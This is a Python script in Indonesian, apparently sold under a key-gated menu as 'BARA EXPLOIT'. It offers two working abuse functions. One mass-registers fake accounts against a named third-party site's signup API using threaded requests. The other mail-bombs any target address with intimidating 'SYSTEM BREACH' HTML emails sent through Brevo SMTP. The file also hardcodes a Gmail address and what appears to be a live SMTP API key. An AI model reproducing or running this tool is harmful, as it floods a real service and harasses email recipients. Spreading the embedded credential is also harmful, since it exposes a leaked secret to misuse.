import requests
import random
import string
import time
import os
import sys
import re
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("[-] Install dulu: pip install colorama requests")
    sys.exit()

# ==========================================
# KONFIGURASI & PATH
# ==========================================
NOVA_URL = "https://nova-wawa.vercel.app/api/register"

# Pake Path Absolut biar ga bingung
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
APIKEY_FILE = os.path.join(BASE_DIR, "apikey.js")
USED_KEYS_FILE = os.path.join(BASE_DIR, "used_keys.txt")

BREVO_SMTP_SERVER = "smtp-relay.brevo.com"
BREVO_SMTP_PORT = 587
BREVO_SMTP_LOGIN = "ttingg48@gmail.com" 
BREVO_SMTP_PASSWORD = "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" 
PENGIRIM_EMAIL = "ttingg48@gmail.com" 

# Warna
C_RED = '\033[91m'
C_GREEN = '\033[92m'
C_YELLOW = '\033[93m'
C_BLUE = '\033[94m'
C_MAGENTA = '\033[95m'
C_CYAN = '\033[96m'
C_WHITE = '\033[97m'
C_RESET = '\033[0m'
C_BOLD = '\033[1m'

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def animasi_banner():
    ascii_art = [
        "██████╗  █████╗ ██████╗  █████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗",
        "██╔══██╗██╔══██╗██╔══██╗██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝",
        "██████╔╝███████║██████╔╝███████║    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   ",
        "██╔══██╗██╔══██║██╔══██╗██╔══██║    ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ",
        "██████╔╝██║  ██║██║  ██║██║  ██║    ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ",
        "╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
    ]
    colors = [C_RED, C_YELLOW, C_GREEN, C_CYAN, C_BLUE, C_MAGENTA]
    for shift in range(15):
        clear()
        print("\n")
        for i, line in enumerate(ascii_art):
            color_idx = (i + shift) % len(colors)
            print(f"{colors[color_idx]}{C_BOLD}{line}{C_RESET}")
        print(f"\n{C_WHITE}                        [ PREMIUM TOOLKING V3 ]{C_RESET}")
        print(f"{C_WHITE}                              Dev: BARA{C_RESET}\n")
        time.sleep(0.05)

def get_decrypted_keys():
    if not os.path.exists(APIKEY_FILE):
        print(f"\n{C_RED}[DEBUG] File {APIKEY_FILE} NGGAK ADA!{C_RESET}")
        return []

    try:
        with open(APIKEY_FILE, "r", encoding="utf-8") as f:
            content = f.read()
            
        # Regex sakti buat nangkep string apapun di dalam tanda kutip
        # Kalo formatnya obfuscated (a0_0x...), kita coba ambil string yang ada 'bara' atau 'vip'
        keys = re.findall(r'"([^"]+)"', content)
        filtered = [k for k in keys if "bara" in k.lower() or "vip" in k.lower()]
        
        if not filtered:
            print(f"\n{C_RED}[DEBUG] File apikey.js KETEMU, tapi nggak ada key valid (harus ada kata 'bara' atau 'vip').{C_RESET}")
            print(f"{C_YELLOW}[DEBUG] Isi file apikey.js lo (50 karakter pertama): {content[:50]}...{C_RESET}")
            return []
            
        return filtered
    except Exception as e:
        print(f"\n{C_RED}[DEBUG] ERROR BACA FILE: {e}{C_RESET}")
        return []

# ==========================================
# MENU 1: SPAM LOGIN
# ==========================================
def tembak_register():
    rand_str = ''.join(random.choices(string.ascii_lowercase, k=4))
    timestamp = int(time.time() * 1000) 
    prefix = random.choice(["User", "VIP", "Siswa", "Member", "Baru", "Bara", "Anon"])
    nama = f"{prefix}_{rand_str}"
    password = f"Qwerty{random.randint(100, 999)}!"
    
    payload = {
        "full_name": nama,
        "birth_year": str(random.randint(1990, 2006)),
        "email": f"{nama.lower()}_{timestamp}@gmail.com",
        "password": password,
        "agree": True
    }
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
    }
    try:
        res = requests.post(NOVA_URL, json=payload, headers=headers, timeout=5)
        return res.status_code in [200, 201]
    except:
        return False

def eksekusi_spam_login():
    clear()
    print(f"{C_CYAN}=== SPAM LOGIN ==={C_RESET}")
    try:
        jumlah = int(input(f"{C_YELLOW}Masukkan jumlah spam (max 500): {C_RESET}"))
    except:
        return
    
    print(f"\n{C_YELLOW}[*] Menyiapkan {jumlah} akun...{C_RESET}")
    start_time = time.time()
    sukses = 0
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(tembak_register) for _ in range(jumlah)]
        for i, f in enumerate(futures):
            if f.result(): sukses += 1
            percent = int((i + 1) / jumlah * 100)
            sys.stdout.write(f"\r{C_GREEN}[Progress] {percent}% ({sukses} Sukses){C_RESET}")
            sys.stdout.flush()
            
    elapsed = time.time() - start_time
    print(f"\n\n{C_GREEN}[✅] SELESAI! Sukses: {sukses} | Gagal: {jumlah - sukses} | Waktu: {elapsed:.2f}s{C_RESET}")
    input(f"\n{C_CYAN}Tekan Enter buat balik...{C_RESET}")

# ==========================================
# MENU 2: SPAM EMAIL
# ==========================================
def kirim_email_brevo(target, pesan):
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <style>
            body {{ margin: 0; padding: 40px; font-family: 'Fira Code', monospace; background: #050505; color: #00ff41; }}
            .card {{ background: rgba(10, 10, 10, 0.9); border: 2px solid #00ff41; padding: 30px; border-radius: 12px; max-width: 500px; margin: auto; text-align: center; }}
            .glitch {{ font-size: 28px; font-weight: 900; color: #ff003c; text-transform: uppercase; margin-bottom: 20px; }}
            .gambar {{ width: 100%; max-height: 200px; object-fit: cover; border-radius: 8px; border: 1px solid #00ff41; margin-bottom: 20px; }}
            .pesan-box {{ background: rgba(0, 255, 65, 0.1); border-left: 4px solid #00ff41; padding: 15px; text-align: left; margin-bottom: 25px; }}
            summary {{ background: #111; border: 1px solid #00ff41; padding: 10px; cursor: pointer; font-weight: bold; text-align: center; }}
            .footer {{ font-size: 11px; color: #555; margin-top: 30px; }}
        </style>
    </head>
    <body>
        <div class="card">
            <div class="glitch">SYSTEM BREACH</div>
            <img src="https://files.catbox.moe/n04bax.png" class="gambar">
            <div class="pesan-box">{pesan}</div>
            <details><summary>🔊 BUKA AUDIO</summary><audio controls loop><source src="https://files.catbox.moe/6xi33i.mp3" type="audio/mpeg"></audio></details>
            <div class="footer">DEV: BARA</div>
        </div>
    </body>
    </html>
    """
    msg = MIMEMultipart()
    msg['From'] = PENGIRIM_EMAIL
    msg['To'] = target
    msg['Subject'] = f"⚠️ SYSTEM ALERT {random.randint(100, 999)}"
    msg.attach(MIMEText(html_content, 'html'))

    try:
        server = smtplib.SMTP(BREVO_SMTP_SERVER, BREVO_SMTP_PORT)
        server.starttls()
        server.login(BREVO_SMTP_LOGIN, BREVO_SMTP_PASSWORD)
        server.send_message(msg)
        server.quit()
        return True
    except:
        return False

def eksekusi_spam_email():
    clear()
    print(f"{C_CYAN}=== SPAM EMAIL ==={C_RESET}")
    target = input(f"{C_YELLOW}Email Target: {C_RESET}")
    pesan = input(f"{C_YELLOW}Pesan: {C_RESET}")
    try:
        jumlah = int(input(f"{C_YELLOW}Jumlah spam: {C_RESET}"))
    except:
        return

    print(f"\n{C_YELLOW}[*] Memproses...{C_RESET}")
    sukses = 0
    for i in range(1, jumlah + 1):
        if kirim_email_brevo(target, pesan):
            sukses += 1
            print(f"{C_GREEN}[✅] [{i}/{jumlah}] Terkirim!{C_RESET}")
        else:
            print(f"{C_RED}[❌] [{i}/{jumlah}] Gagal (Cek Brevo).{C_RESET}")
        time.sleep(1.5) 
        
    print(f"\n{C_GREEN}[✅] Selesai! Sukses: {sukses}/{jumlah}{C_RESET}")
    input(f"\n{C_CYAN}Tekan Enter...{C_RESET}")

# ==========================================
# MAIN
# ==========================================
def main():
    animasi_banner()
    
    print(f"{C_CYAN}[*] Mencari file apikey.js di: {APIKEY_FILE}{C_RESET}")
    time.sleep(1)
    
    valid_keys = get_decrypted_keys()
    if not valid_keys:
        print(f"\n{C_RED}[❌] Gagal load API Key. Cek pesan DEBUG di atas.{C_RESET}")
        sys.exit()

    print(f"\n{C_GREEN}[✅] Berhasil load {len(valid_keys)} API Key.{C_RESET}")
    print(f"{C_YELLOW}Masukkan API Key lo: {C_RESET}")
    user_key = input("> ").strip()

    if user_key not in valid_keys:
        print(f"\n{C_RED}[❌] API KEY TIDAK VALID! Akses Ditolak.{C_RESET}")
        print(f"{C_YELLOW}[DEBUG] Key yang lo masukin: {user_key}{C_RESET}")
        print(f"{C_YELLOW}[DEBUG] Contoh key valid: {valid_keys[0]}{C_RESET}")
        sys.exit()

    if os.path.exists(USED_KEYS_FILE):
        with open(USED_KEYS_FILE, "r") as f:
            if user_key in f.read().splitlines():
                print(f"\n{C_RED}[❌] API KEY SUDAH DIPAKAI! Key hangus.{C_RESET}")
                sys.exit()

    with open(USED_KEYS_FILE, "a") as f:
        f.write(user_key + "\n")
        
    print(f"{C_GREEN}[✅] API KEY VALID!{C_RESET}")
    time.sleep(1)

    while True:
        clear()
        m_c = [C_CYAN, C_MAGENTA, C_GREEN][int(time.time()) % 3]
        print(f"""{m_c}
======================================================
                BARA EXPLOIT - MAIN MENU
======================================================
{C_YELLOW}1. {C_WHITE}Spam Login
{C_YELLOW}2. {C_WHITE}Spam Email
{C_YELLOW}0. {C_WHITE}Keluar
{m_c}======================================================
{C_WHITE}Dev: BARA | Key: {user_key[:5]}***{C_RESET}""")
        
        pilihan = input(f"{C_YELLOW}Pilih menu (0-2): {C_RESET}").strip()

        if pilihan == '1': eksekusi_spam_login()
        elif pilihan == '2': eksekusi_spam_email()
        elif pilihan == '0':
            print(f"{C_RED}[!] Keluar...{C_RESET}")
            sys.exit()
        else:
            print(f"{C_RED}[!] Pilihan tidak valid!{C_RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!] Dihentikan.{C_RESET}")
        sys.exit()
